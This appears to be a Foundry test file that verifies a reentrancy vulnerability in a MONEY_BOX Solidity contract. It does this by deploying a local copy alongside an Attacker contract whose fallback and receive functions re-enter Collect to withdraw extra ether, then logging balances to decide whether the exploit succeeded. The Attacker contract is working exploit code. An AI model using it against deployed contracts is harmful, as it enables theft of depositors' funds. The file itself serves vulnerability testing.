// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";

contract ReentrancyTest is Test {
    MONEY_BOX moneyBox;
    Log logContract;
    Attacker attacker;

    function setUp() public {
        logContract = new Log();
        moneyBox = new MONEY_BOX();
        moneyBox.SetLogFile(address(logContract));
        moneyBox.SetMinSum(1 ether);

        attacker = new Attacker(payable(address(moneyBox)));
        
        // Fund the attacker contract
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits funds
        attacker.deposit{value: 1 ether}();

        console.log("--- BEFORE-Trigger State ---");
        uint256 moneyBoxBalanceBefore = address(moneyBox).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        (, uint256 attackerAccBalanceBefore) = moneyBox.Acc(address(attacker));

        console.log("MONEY_BOX ETH Balance:", moneyBoxBalanceBefore);
        console.log("Attacker ETH Balance:", attackerBalanceBefore);
        console.log("Attacker Account Balance in MONEY_BOX:", attackerAccBalanceBefore);

        console.log("--- Trigger Attack ---");
        attacker.attack();

        console.log("--- AFTER-Trigger State ---");
        uint256 moneyBoxBalanceAfter = address(moneyBox).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        (, uint256 attackerAccBalanceAfter) = moneyBox.Acc(address(attacker));

        console.log("MONEY_BOX ETH Balance:", moneyBoxBalanceAfter);
        console.log("Attacker ETH Balance:", attackerBalanceAfter);
        console.log("Attacker Account Balance in MONEY_BOX:", attackerAccBalanceAfter);

        // Calculate state changes
        uint256 attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        uint256 moneyBoxLoss = moneyBoxBalanceBefore - moneyBoxBalanceAfter;

        console.log("Attacker Profit (ETH):", attackerProfit);
        console.log("MONEY_BOX Loss (ETH):", moneyBoxLoss);
        console.log("Attacker Account Balance After:", attackerAccBalanceAfter);

        // Vulnerability conditions
        bool condition1 = attackerProfit > 1 ether;
        bool condition2 = moneyBoxLoss > 1 ether;
        bool condition3 = attackerAccBalanceAfter > 1 ether;

        console.log("Condition1 (Attacker Profit > 1 ether):", condition1 ? "true" : "false");
        console.log("Condition2 (MONEY_BOX Loss > 1 ether):", condition2 ? "true" : "false");
        console.log("Condition3 (Attacker Account Balance > 1 ether):", condition3 ? "true" : "false");

        // Final verdict
        if (condition1 && condition2 && condition3) {
            console.log("Vulnerability Exists: All differential conditions indicate successful reentrancy exploitation");
        } else {
            console.log("Vulnerability not Exist: Required differential conditions were not met");
        }
    }
}

contract Attacker {
    MONEY_BOX public moneyBox;
    uint public count;

    constructor(address payable _moneyBox) {
        moneyBox = MONEY_BOX(_moneyBox);
    }

    function deposit() public payable {
        // Deposit funds to become eligible for withdrawal
        moneyBox.Put{value: msg.value}(0);
    }

    function attack() public {
        // Start reentrancy attack
        moneyBox.Collect(1 ether);
    }

    fallback() external payable {
        if (count < 1 && address(moneyBox).balance >= 1 ether) {
            count++;
            moneyBox.Collect(1 ether);
        }
    }

    receive() external payable {
        if (count < 1 && address(moneyBox).balance >= 1 ether) {
            count++;
            moneyBox.Collect(1 ether);
        }
    }
}